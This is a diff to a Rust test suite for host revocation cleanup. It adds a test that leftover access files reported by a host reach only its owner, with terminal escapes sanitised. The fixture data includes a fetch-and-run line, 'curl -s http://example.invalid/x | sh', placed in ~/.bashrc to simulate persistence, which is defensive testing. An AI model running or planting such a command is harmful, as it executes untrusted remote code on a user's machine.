@@ -185,6 +185,54 @@ async fn authorized_host_revocation_retains_cleanup_after_authority_retirement()
     eprintln!("login_cleanup pending_after_retirement=true durable_reconnect_confirmed=true");
 }
 
+/// D356: the access files a host reports with its revocation reach the owner
+/// through the cleanup outbox. The report is kept with the receipt that
+/// confirms the revocation, cleaned of terminal escapes, readable by the
+/// host's owner only, and pending until the host confirms.
+#[tokio::test]
+async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
+    let fixture = login_host(None).await;
+    let retirement = pending_retirement(&fixture).await;
+    let owner = fixture.person.to_string();
+    assert_eq!(
+        crate::access_report::read(&fixture.pool, &owner, fixture.host)
+            .await
+            .unwrap(),
+        Some(crate::access_report::Reading::Pending)
+    );
+    let changed = serde_json::json!({"files":[
+        {"path":"~/.ssh/authorized_keys","lines":["ssh-ed25519 AAAAleft left-behind"]},
+        {"path":"~/.bashrc","lines":["curl -s http://example.invalid/x | sh\u{1b}[2J"]},
+        {"path":"~/.profile","lines":[],"note":"a symbolic link; not followed"}
+    ],"truncated":false});
+    reconnect_cleanup_reporting(&fixture, Some(true), Some(changed)).await;
+    retirement.await.unwrap().unwrap();
+    let Some(crate::access_report::Reading::Ready(reports)) =
+        crate::access_report::read(&fixture.pool, &owner, fixture.host)
+            .await
+            .unwrap()
+    else {
+        panic!("the confirmed revocation has no report for its owner");
+    };
+    assert_eq!(reports.len(), 1);
+    let (person, report) = &reports[0];
+    assert_eq!(*person, fixture.person);
+    let paths: Vec<&str> = report.files.iter().map(|file| file.path.as_str()).collect();
+    assert_eq!(paths, ["~/.ssh/authorized_keys", "~/.bashrc", "~/.profile"]);
+    assert_eq!(report.files[0].lines, ["ssh-ed25519 AAAAleft left-behind"]);
+    assert_eq!(
+        report.files[1].lines,
+        ["curl -s http://example.invalid/x | sh\u{fffd}[2J"]
+    );
+    assert_eq!(
+        crate::access_report::read(&fixture.pool, "owner", fixture.host)
+            .await
+            .unwrap(),
+        None,
+        "another account read this host's report"
+    );
+}
+
 /// Offline cleanup cuts normal authority but cannot complete retirement.
 #[tokio::test]
 async fn unconfirmed_person_cleanup_does_not_block_host_authority_cut() {
@@ -289,6 +337,16 @@ async fn cleanup_disconnected(host: Uuid) {
 /// Reconnect a tombstoned host using its real enrolled mTLS identity. The only
 /// admitted request must be the persisted person's cleanup, never a new login.
 async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
+    reconnect_cleanup_reporting(fixture, durable, None).await;
+}
+
+/// [`reconnect_cleanup`] whose durable reply also carries D356's `changed`
+/// report, as a host returns it.
+async fn reconnect_cleanup_reporting(
+    fixture: &LoginHost,
+    durable: Option<bool>,
+    changed: Option<serde_json::Value>,
+) {
     let connection = remote_tls::dial(
         fixture.listeners.local_addr().unwrap(),
         "localhost",
@@ -334,7 +392,11 @@ async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
             cleanup_disconnected(fixture.host).await;
             return;
         };
-        let json = serde_json::json!({"revoked": durable}).to_string();
+        let mut reply = serde_json::json!({"revoked": durable});
+        if let Some(changed) = &changed {
+            reply["changed"] = changed.clone();
+        }
+        let json = reply.to_string();
         Transmit::default()
             .send(
                 &connection.channel,
